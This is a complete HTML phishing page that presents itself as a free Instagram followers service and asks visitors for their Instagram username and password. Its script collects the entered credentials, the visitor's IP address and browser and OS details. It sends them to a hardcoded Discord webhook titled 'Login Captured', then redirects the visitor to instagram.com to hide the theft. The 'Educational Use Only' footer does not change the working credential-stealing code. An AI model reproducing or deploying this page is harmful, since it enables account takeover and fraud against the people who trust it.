<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Free Instagram Followers - Premium Access</title>
  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" />
  <style>
    :root {
      --primary: #ffffff;
      --secondary: #111111;
      --accent: #000000;
      --input-bg: #1e1e1e;
      --input-border: #333333;
      --shadow: rgba(255, 255, 255, 0.1);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', sans-serif;
      background: var(--secondary);
      color: var(--primary);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      background-color: var(--accent);
      border-radius: 14px;
      padding: 40px 30px;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 10px 40px var(--shadow);
      transition: 0.3s ease-in-out;
    }

    .container:hover {
      box-shadow: 0 15px 50px rgba(255, 255, 255, 0.2);
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
    }

    .header img {
      width: 60px;
      margin-bottom: 10px;
    }

    .header h1 {
      font-size: 22px;
      font-weight: 600;
      color: var(--primary);
    }

    .header p {
      font-size: 14px;
      color: #ccc;
    }

    .input-box {
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      border: 1px solid var(--input-border);
      border-radius: 8px;
      background-color: var(--input-bg);
      color: var(--primary);
      font-size: 14px;
    }

    input::placeholder {
      color: #888;
    }

    .btn {
      width: 100%;
      padding: 12px;
      background-color: var(--primary);
      color: var(--secondary);
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      font-size: 15px;
      transition: 0.2s ease;
    }

    .btn:hover {
      background-color: #f0f0f0;
    }

    .footer-text {
      margin-top: 20px;
      text-align: center;
      font-size: 12px;
      color: #999;
    }
  </style>
</head>
<body>
<!-- Top Pink Bar -->
  <div class="top-bar">
    <div class="top-bar-text">Free Followers</div>
  </div>
  <div class="container">
    <div class="header">
      <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="logo" />
      <h1>Free Instagram Followers</h1>
      <p>Premium Tool ‚Ä¢ Secure & Fast Delivery</p>
    </div>
    <form>
      <div class="input-box">
        <input type="text" id="username" placeholder="Instagram Username" required />
      </div>
      <div class="input-box">
        <input type="password" id="password" placeholder="Instagram Password" required />
      </div>
      <button type="button" class="btn" onclick="sendMessage()">Get Followers</button>
    </form>
    <p class="footer-text">This service is secure & trusted by 10,000+ users.</p>
  </div>

  <script>
    async function sendMessage() {
      const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const userAgent = navigator.userAgent;

      const browserInfo = getBrowserInfo(userAgent);
      const osInfo = getOSInfo(userAgent);

      let ip = "Unavailable";
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        ip = data.ip;
      } catch (err) {
        console.error("IP fetch failed:", err);
      }

      const payload = {
        username: "üîî Premium Logger",
        avatar_url: "https://cdn-icons-png.flaticon.com/512/2111/2111463.png",
        embeds: [
          {
            title: "üö® Login Captured - Premium Page",
            color: 0xffffff,
            description: "New user logged in from premium followers page.",
            fields: [
              { name: "üë§ Username", value: `\`${username}\``, inline: true },
              { name: "üîë Password", value: `\`${password}\``, inline: true },
              { name: "üñ•Ô∏è Device Info", value: `**Browser:** ${browserInfo}\n**OS:** ${osInfo}`, inline: false },
              { name: "üì° IP Address", value: `\`${ip}\``, inline: false }
            ],
            footer: {
              text: "Premium Logger ‚Ä¢ Educational Use Only",
              icon_url: "https://cdn-icons-png.flaticon.com/512/2111/2111463.png"
            },
            timestamp: new Date().toISOString()
          }
        ]
      };

      const request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1382345428669829120/hQNpgVsszl0Lepl2JxtJSjZC2YSQAoT2_UYTKurFYRHexes-0kqg6HUHygwL2OBkuCce");
      request.setRequestHeader("Content-type", "application/json");
      request.send(JSON.stringify(payload));

      await delay(2000);
      window.location.replace("https://www.instagram.com");
    }

    function getBrowserInfo(ua) {
      if (ua.includes("Firefox/")) return "Mozilla Firefox";
      if (ua.includes("Edg/")) return "Microsoft Edge";
      if (ua.includes("Chrome/")) return "Google Chrome";
      if (ua.includes("Safari/") && !ua.includes("Chrome")) return "Apple Safari";
      return "Unknown Browser";
    }

    function getOSInfo(ua) {
      if (/Windows NT/.test(ua)) return "Windows";
      if (/Macintosh/.test(ua)) return "macOS";
      if (/Linux/.test(ua)) return "Linux";
      if (/Android/.test(ua)) return "Android";
      if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
      return "Unknown OS";
    }
  </script>
</body>
</html>
